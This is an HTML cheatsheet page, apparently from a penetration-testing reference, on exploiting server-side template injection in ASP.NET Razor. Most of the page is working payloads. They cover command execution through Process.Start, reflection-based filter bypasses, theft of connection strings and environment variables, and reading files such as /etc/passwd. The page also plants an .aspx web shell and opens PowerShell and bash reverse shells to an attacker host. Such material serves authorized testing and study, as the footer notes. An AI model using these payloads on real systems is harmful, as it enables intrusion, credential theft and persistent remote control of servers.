@@ -1,0 +1,163 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Razor (.NET - ASP.NET, ASP.NET Core) · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>Razor (.NET - ASP.NET, ASP.NET Core)</h1><p class="cx-lede">SSTI exploitation in Razor - System.Diagnostics.Process abuse, full .NET BCL access, payloads for ASP.NET Core admin sinks.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1059.001</span><span class="cx-tag">D3FEND D3-EAL</span><span class="cx-tag">IMPACT ServerSideEval, RCE, FileRead</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Razor evaluates C#. If you reach Razor compilation with user input, you have full .NET BCL access - <code>System.Diagnostics.Process.Start</code>, <code>System.IO.File</code>, anything in the application's referenced assemblies.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Confirm Razor
+@(7*7)                                       # → 49
+@System.Environment.MachineName              # returns server hostname
+
+# RCE - direct
+@System.Diagnostics.Process.Start(&quot;cmd&quot;, &quot;/c whoami&quot;).StandardOutput.ReadToEnd()
+@{ var p = new System.Diagnostics.Process(); p.StartInfo.FileName = &quot;cmd&quot;; p.StartInfo.Arguments = &quot;/c whoami&quot;; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); p.WaitForExit(); @p.StandardOutput.ReadToEnd() }
+
+# File read
+@System.IO.File.ReadAllText(@&quot;C:\Windows\System32\drivers\etc\hosts&quot;)
+@System.IO.File.ReadAllText(&quot;/etc/passwd&quot;)   # Linux .NET Core</code></pre></figure>
+<p>Success indicator: command output (username, hostname, file contents) in response.</p>
+<h2 id="where-this-engine-lives">Where this engine lives</h2>
+<ul>
+<li><strong>ASP.NET (Web Forms with Razor)</strong> - <code>.cshtml</code> files. SSTI sinks are rare on classic Web Forms but appear in custom CMSes.</li>
+<li><strong>ASP.NET Core MVC</strong> - Razor is the default view engine. Sinks are in admin "template editor" features or anywhere <code>RazorEngine</code> / <code>RazorLight</code> is invoked with user input.</li>
+<li><strong>Umbraco CMS</strong> - <code>.cshtml</code> templates editable by admins. Common target.</li>
+<li><strong>Orchard Core</strong> - Razor templates in widget definitions.</li>
+<li><strong>DotNetNuke / DNN</strong> - module Razor templates.</li>
+<li><strong>Custom .NET apps</strong> - anything embedding <code>RazorEngine.Engine.Razor.RunCompile()</code> with externally-influenced input.</li>
+</ul>
+<h2 id="step-1-confirm-and-orient">Step 1 - Confirm and orient</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>@(7*7)                           # → 49        confirms Razor template eval
+@System.Environment.MachineName  # returns hostname - confirms .NET BCL access
+@DateTime.Now                    # returns current server time</code></pre></figure>
+<p>If <code>@(7*7)</code> returns <code>49</code>, Razor is evaluating. Move directly to step 2 - there's no sandbox layer in Razor by default.</p>
+<h2 id="step-2-rce-paths">Step 2 - RCE paths</h2>
+<p>C# has multiple process-launch APIs. Pick based on what the application reflects.</p>
+<h3 id="path-a-processstart-with-output-capture">Path A - <code>Process.Start</code> with output capture</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>@{
+  var psi = new System.Diagnostics.ProcessStartInfo(&quot;cmd.exe&quot;, &quot;/c whoami&quot;) {
+    UseShellExecute = false,
+    RedirectStandardOutput = true
+  };
+  var p = System.Diagnostics.Process.Start(psi);
+  p.WaitForExit();
+  @p.StandardOutput.ReadToEnd()
+}</code></pre></figure>
+<p>The verbose form. Captures stdout and reflects it. Use when you control a full code block.</p>
+<h3 id="path-b-processstart-one-liner">Path B - <code>Process.Start</code> one-liner</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>@System.Diagnostics.Process.Start(&quot;cmd.exe&quot;, &quot;/c whoami&quot;).StandardOutput.ReadToEnd()</code></pre></figure>
+<p>Won't capture output without <code>RedirectStandardOutput</code> - usually returns empty or null reference. Use when you only need the command to run, not the output.</p>
+<h3 id="path-c-linux-net-core">Path C - Linux .NET Core</h3>
+<p>On .NET Core / .NET 5+ running on Linux:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>@{
+  var psi = new System.Diagnostics.ProcessStartInfo(&quot;/bin/sh&quot;, &quot;-c \&quot;id\&quot;&quot;) {
+    UseShellExecute = false,
+    RedirectStandardOutput = true
+  };
+  var p = System.Diagnostics.Process.Start(psi);
+  p.WaitForExit();
+  @p.StandardOutput.ReadToEnd()
+}</code></pre></figure>
+<p>Same shape, different executable.</p>
+<h3 id="path-d-systemreflection-for-blocked-namespace-bypass">Path D - <code>System.Reflection</code> for blocked-namespace bypass</h3>
+<p>If <code>System.Diagnostics</code> is filtered, reach <code>Process</code> via reflection:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>@{
+  var t = System.Type.GetType(&quot;System.Diagnostics.Process&quot;);
+  var startMethod = t.GetMethod(&quot;Start&quot;, new System.Type[] { typeof(string), typeof(string) });
+  startMethod.Invoke(null, new object[] { &quot;cmd.exe&quot;, &quot;/c whoami&quot; });
+}</code></pre></figure>
+<p>Cleaner via <code>Assembly.Load</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>@{
+  var asm = System.Reflection.Assembly.Load(&quot;System.Diagnostics.Process&quot;);
+  var t = asm.GetType(&quot;System.Diagnostics.Process&quot;);
+  // ... invoke as above
+}</code></pre></figure>
+<h2 id="step-3-loot-before-escalating">Step 3 - Loot before escalating</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Application config / connection strings
+@System.Configuration.ConfigurationManager.ConnectionStrings[&quot;default&quot;].ConnectionString
+@System.Configuration.ConfigurationManager.AppSettings.AllKeys
+
+# ASP.NET Core configuration (when IConfiguration is reachable through @inject)
+@inject Microsoft.Extensions.Configuration.IConfiguration Config
+@Config[&quot;ConnectionStrings:DefaultConnection&quot;]
+
+# Environment variables
+@System.Environment.GetEnvironmentVariables()
+@System.Environment.GetEnvironmentVariable(&quot;ASPNETCORE_ENVIRONMENT&quot;)
+
+# Server info
+@System.Environment.MachineName
+@System.Environment.UserName                 # account the app runs as
+@System.Environment.OSVersion
+@System.Environment.CurrentDirectory         # application root
+@System.Environment.SystemDirectory
+
+# Loaded assemblies (reveals frameworks/libraries in use)
+@string.Join(&quot;,&quot;, System.AppDomain.CurrentDomain.GetAssemblies().Select(a =&gt; a.FullName))</code></pre></figure>
+<p>Connection strings frequently contain DB credentials in plaintext - often sufficient on its own.</p>
+<h2 id="step-4-file-operations">Step 4 - File operations</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Read
+@System.IO.File.ReadAllText(@&quot;C:\Windows\win.ini&quot;)
+@System.IO.File.ReadAllText(&quot;/etc/passwd&quot;)
+@System.IO.File.ReadAllLines(@&quot;C:\path\to\config.json&quot;)
+
+# Directory listing
+@string.Join(&quot;,&quot;, System.IO.Directory.GetFiles(@&quot;C:\&quot;))
+@string.Join(&quot;,&quot;, System.IO.Directory.GetFiles(&quot;/etc&quot;))
+
+# Write
+@{ System.IO.File.WriteAllText(@&quot;C:\inetpub\wwwroot\x.aspx&quot;, &quot;&lt;%@ Page Language=\&quot;C#\&quot; %&gt;&lt;% Response.Write(System.Diagnostics.Process.Start(\&quot;cmd\&quot;,\&quot;/c \&quot;+Request[\&quot;c\&quot;]).StandardOutput.ReadToEnd()); %&gt;&quot;); }</code></pre></figure>
+<p>The web-shell write creates an <code>.aspx</code> file accessible at <code>/x.aspx?c=whoami</code> for follow-up commands without re-triggering the SSTI.</p>
+<h2 id="step-5-reverse-shell">Step 5 - Reverse shell</h2>
+<p>PowerShell encoded payload via <code>Process.Start</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>@System.Diagnostics.Process.Start(&quot;powershell.exe&quot;, &quot;-NoP -NonI -W Hidden -Enc BASE64_PAYLOAD&quot;)</code></pre></figure>
+<p>Replace <code>BASE64_PAYLOAD</code> with the UTF-16LE base64 of:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">$client = New-Object System.Net.Sockets.TCPClient(&#x27;&lt;LHOST&gt;&#x27;,&lt;LPORT&gt;); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()</code></pre></figure>
+<p>For .NET Core on Linux:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>@System.Diagnostics.Process.Start(&quot;/bin/sh&quot;, &quot;-c \&quot;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1\&quot;&quot;)</code></pre></figure>
+<h2 id="razor-engine-specific-notes">Razor-engine-specific notes</h2>
+<p>Two distinct libraries handle Razor outside the ASP.NET runtime:</p>
+<ul>
+<li><strong>RazorEngine</strong> - older package, NuGet <code>RazorEngine</code>. Trivially exploitable when called with user input.</li>
+<li><strong>RazorLight</strong> - newer, NuGet <code>RazorLight</code>. Same exploitability profile.</li>
+</ul>
+<p>Sinks look like:</p>
+<figure class="cx-code"><figcaption>csharp</figcaption><pre><code class="language-csharp">// RazorEngine
+var result = RazorEngine.Engine.Razor.RunCompile(userInput, &quot;templateKey&quot;, null, model);
+
+// RazorLight
+var result = await engine.CompileRenderStringAsync(&quot;templateKey&quot;, userInput, model);</code></pre></figure>
+<p>These libraries are how Razor SSTI shows up outside MVC views - for example, in headless services that template email or report content.</p>
+<h2 id="filter-aware-variants">Filter-aware variants</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Namespace fragments concatenated
+@{ var ns = &quot;System.Diagn&quot; + &quot;ostics.Process&quot;; }
+@{ var t = System.Type.GetType(ns); /* ... */ }
+
+# Unicode escapes in C# string literals (Razor compiles to C#)
+@System.Diagnostics.\u0050rocess.Start(&quot;cmd&quot;, &quot;/c id&quot;)
+
+# Through @using
+@using SDP = System.Diagnostics.Process
+@SDP.Start(&quot;cmd&quot;, &quot;/c id&quot;)</code></pre></figure>
+<p>Razor's filter surface is narrow because the compiler accepts so many equivalent forms. Filtering by string match almost always misses an alternative path.</p>
+<h2 id="detection-only-payloads">Detection-only payloads</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>@(7*7)                                       # eval probe (returns 49)
+@System.Environment.MachineName              # returns hostname (clear ID of Razor)
+@DateTime.Now                                # returns server time
+@System.IO.Path.DirectorySeparatorChar       # returns &quot;\&quot; on Windows, &quot;/&quot; on Linux - OS fingerprint
+@System.Environment.OSVersion.Platform       # returns Win32NT or Unix</code></pre></figure>
+<p><code>@System.IO.Path.DirectorySeparatorChar</code> is a useful early probe - it returns a single character that's hard to confuse with anything else and tells you the OS in one go.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong><code>@{ }</code> code blocks</strong> allow multi-statement C#. Useful for capturing process output cleanly.</li>
+<li><strong><code>@:</code> inline output</strong> lets you reflect the result of an expression as text instead of an HTML node - useful in cases where the output is being structured as JSON or YAML.</li>
+<li><strong>MVC view compilation</strong> - ASP.NET Core compiles views ahead of time by default (Razor compilation in build pipeline). User-input templates require explicit runtime compilation via <code>RazorViewEngine</code> or one of the standalone libraries above.</li>
+<li><strong><code>ConfigurationManager</code> is .NET Framework only</strong> - on .NET Core / .NET 5+, configuration access is through <code>IConfiguration</code> via dependency injection. Use the <code>@inject</code> directive in a Razor view (if you can include it) or reach configuration through the static <code>ConfigurationBuilder</code> path.</li>
+<li><strong>Output suppression</strong> - Razor errors during compilation throw <code>RazorEngineCompilationException</code> (or similar). Production apps usually swallow these to a generic error page. If a probe produces no output but the page still renders normally, the compilation likely failed - try simpler probes to confirm presence first.</li>
+</ul>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>Razor SSTI typically lives in admin-only template editors. By the time you're authenticated as an admin in an ASP.NET app, you already have substantial access - the SSTI is mostly useful for code execution at the OS level rather than further privilege escalation within the app. Confirm scope before going past <code>@System.Environment.MachineName</code>.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../handlebars/index.html">Previous: Handlebars (Node - Express, Ghost)</a><a class="cx-next" href="../tornado/index.html">Next: Tornado (Python - Tornado web framework)</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
